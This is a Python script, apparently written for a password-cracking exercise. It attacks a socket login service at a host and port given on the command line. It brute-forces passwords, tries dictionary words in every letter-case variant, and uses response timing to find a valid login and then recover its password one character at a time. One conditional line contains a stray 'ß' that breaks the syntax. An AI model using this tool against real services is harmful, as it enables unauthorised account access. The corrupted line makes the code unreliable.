import argparse
import socket
import itertools
import string
import json
import time


class Socket:
    def __init__(self, host, port):
        self.host = str(host)
        self.port = int(port)
        self.socket_creation()

    def socket_creation(self):
        self.client = socket.socket()
        address = (self.host, self.port)
        self.client.connect(address)

    def sending_message(self):
        encoded_message = self.message.encode()
        self.client.send(encoded_message)
        self.receiver = self.client.recv(1024)


class FindPass(Socket):
    signs = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    pass_dict = dict()
    result = list()

    def __init__(self, host, port):
        super().__init__(self.host, self.port)
        self.json_pass_finder()

    def pass_gen(self):
        for length in range(1, len(self.signs) + 1):
            for letter in itertools.product(self.signs, repeat=length):
                yield ''.join(letter)

    def pass_finder(self):
        success_checker = False
        for password in self.pass_gen():
            self.message = password
            self.sending_message()
            if self.receiver.decode() == 'Connection success!':
                print(self.message)
                success_checker = True
                break
        if not success_checker:
            print('Too many attempts')
        self.client.close()

    def dict_finder(self):
        success_checker = False
        with open('passwords.txt', 'r') as file:
            for i in file:
                word = ''.join(i.strip().split('\r\n'))
                if word.isalpha():
                    pass_list = list(map(lambda x: ''.join(x),
                                         itertools.product(*([letter.lower(), letter.upper()] for letter in word))))
                    self.pass_dict[word] = pass_list
                else:
                    self.pass_dict[word] = list(word)

        for value in self.pass_dict.values():
            for password in value:
                message = {"login": self.login,
                           "password": password}
                self.message = json.dumps(message)
                self.sending_message()
                print(self.message)
                if json.loads(self.receiver.decode())['result'] == 'Connection success!':
                    success_checker = True
                    break
            if success_checker:
                break

        if not success_checker:
            print('Too many attempts')
        self.client.close()

    def json_pass_finder(self):
        with open('logins.txt', 'r') as file:
            for i in file:
                self.login = ''.join(i.strip().split('\r\n'))
                message = {"login": self.login,
                           "password": ""}
                self.message = json.dumps(message)
                start = time.perf_counter()
                self.sending_message()
                end = time.perf_counter()
                total = end - start
                if total >= 0.09:
                    # json.loads(self.receiver.decode())['result'] == 'Wrong password!':
                    break
        self.pass_finder_2()

    def pass_finder_2(self):
        success_indicator = True
        while success_indicator:
            for sign in self.signs:
                if len(self.result) < 1:
                    message = {"login": self.login,
                               "password": sign}
                else:
                    message = {"login": self.login,
                               "password": ''.join(self.result) + sign}
                self.message = json.dumps(message)
                start = time.perf_counter()
                self.sending_message()
                end = time.perf_counter()
                total = end - start
                if total >= 0.09:
                    # json.loads(self.receiver.decode())['result'] == 'Exception happened during login':
                    self.result.append(sign)
                elif json.loads(self.receiver.decode())['result'] == 'Connection success!':ß
                    print(self.message)
                    success_indicator = False
                    break


class ProjectParser(FindPass):
    def __init__(self):
        self.args = argparse.ArgumentParser()
        self.args.add_argument('host')
        self.args.add_argument('port')
        parser = self.args.parse_args()

        self.host = parser.host
        self.port = parser.port

        super().__init__(self.host, self.port)


if __name__ == '__main__':
    ProjectParser()
